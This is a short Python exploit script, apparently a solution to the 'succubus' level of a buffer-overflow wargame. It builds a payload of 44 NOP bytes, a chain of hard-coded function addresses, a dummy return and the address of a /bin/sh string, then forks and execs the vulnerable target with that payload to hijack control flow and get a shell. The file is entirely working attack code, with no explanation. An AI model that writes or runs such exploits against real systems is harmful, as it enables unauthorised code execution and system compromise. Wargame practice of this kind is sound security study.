import os
import struct
import binascii

payload = ""
target = "/home/zombie_assassin/succubus"
DO = 0x080487ec
GYE = 0x080487bc
GUL = 0x0804878c
YUT = 0x0804875c
MO = 0x08048724
binsh = 0xbffffa68

def append(x):
    return payload + x

def p(x):
    return struct.pack("<L", x)

payload = append("\x90" * 44)
payload = append(p(DO))
payload = append(p(GYE))
payload = append(p(GUL))
payload = append(p(YUT))
payload = append(p(MO))
payload = append("XXXX") #쓰레기 리턴 값(dummy)
payload = append(p(binsh))
payload = append("my-pass")

pid = os.fork()

if pid == 0:
    os.execv(target, ("", payload))
else:
    os.waitpid(pid, 0)